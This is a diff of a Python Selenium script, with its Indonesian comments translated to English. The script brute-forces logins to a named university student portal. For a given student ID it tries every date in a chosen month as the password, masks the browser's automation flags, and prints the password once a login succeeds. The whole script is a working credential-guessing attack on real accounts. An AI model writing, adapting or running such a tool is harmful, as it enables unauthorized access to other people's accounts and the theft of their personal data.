@@ -10,31 +10,30 @@ from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.common.exceptions import TimeoutException
-# input bulan dan tahun
+# Input month and year
 nim = str(input("NIM: "))
 year = int(input("Masukkan tahun (YYYY): "))
 month = int(input("Masukkan bulan (MM): "))
-print(type(nim))
-# mengambil jumlah hari dalam bulan dan tahun yang diberikan
+
+# Take total of days in month and year you gift
 days_in_month = calendar.monthrange(year, month)[1]
 
-# membuat list tanggal dari tanggal 1 sampai jumlah hari dalam bulan tersebut
+# Generate list of dates from 1 to all of days in month
 date_list = [datetime.date(year, month, day).strftime('%Y-%m-%d') for day in range(1, days_in_month+1)]
+print("Generate list of Datetime...")
 
-# menampilkan list tanggal
-print("List tanggal pada bulan {} tahun {}:".format(calendar.month_name[month], year))
 # chrome_options = Options()
 firefox_options = Options()
 # chrome_options.add_argument("--headless")
 firefox_options.set_preference('general.useragent.override', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0')
 firefox_options.set_preference("dom.webdriver.enabled", False)
 firefox_options.set_preference("useAutomationExtension", False)
-# firefox_options.set_preference("headless", False)
+firefox_options.set_preference("headless", False)
 # firefox_options.set_preference("javascript.enabled", False)
 driver = webdriver.Firefox(options=firefox_options)
 # driver = webdriver.Chrome(options=chrome_options)
 # driver = webdriver.Chrome()
-print("sample test case started")
+print("Starting attempt to {}".format(nim))
 driver.get("http://lykan.bsi.ac.id/login.html")
 for date in date_list:
     time.sleep(3)
@@ -48,15 +47,13 @@ for date in date_list:
     # auto()
     # driver.switch_to.alert.accept()
     try:
-        WebDriverWait(driver, 2).until(EC.alert_is_present(),
-                                       'Timed out waiting for PA creation ' +
-                                       'confirmation popup to appear.')
+        WebDriverWait(driver, 2).until(EC.alert_is_present())
         driver.switch_to.alert.accept()
-        print("alert accepted")
+        print("Trying again")
     except TimeoutException:
-        print("no alert")
+        print("Attempt Success!!!")
         if driver.current_url == "http://lykan.bsi.ac.id/beranda.html":
-            print("Password Dari NIM {} adalah {}".format(nim, date))
+            print("Password for {} is {}".format(nim, date))
             break
     # if driver.current_url == "http://lykan.bsi.ac.id/verifikasi.html":
     #     driver.get("http://lykan.bsi.ac.id/login.html")
@@ -70,11 +67,10 @@ for date in date_list:
     # else:
     #     driver.get("http://lykan.bsi.ac.id/login.html")
     #     print(driver.current_url)
-    print(driver.current_url)
-#close the browser
+# Close the browser
 driver.close()
-print("sample test case successfully completed")
-# menutup browser
+print("Program Closed")
+# Quit Browser
 driver.quit()
 
 
